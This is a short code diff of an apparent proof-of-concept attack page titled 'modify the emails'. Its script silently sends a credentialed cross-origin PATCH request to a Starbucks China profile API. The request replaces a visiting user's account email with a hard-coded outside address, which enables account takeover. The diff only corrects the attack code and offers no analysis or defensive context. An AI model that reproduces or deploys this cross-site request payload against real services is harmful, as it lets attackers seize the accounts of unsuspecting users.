@@ -6,14 +6,13 @@
 </head>
 <title>modify the emails</title>
 <script>
-            var data = {};
-		
-	data["email"] = "esperamier@hotmail.com";
+var data = {};
+data["email"] = "esperamier@hotmail.com";
 $.ajax({
             url : 'https://profile.starbucks.com.cn/api/account/email',
-            type : 'PATCH',
+            type : 'patch',
             dataType:'json',
-            contenttype:'application/json',
+            contentType:'application/json',
             data:JSON.stringify(data),
             xhrFields: {
 　　　　　　       withCredentials: true
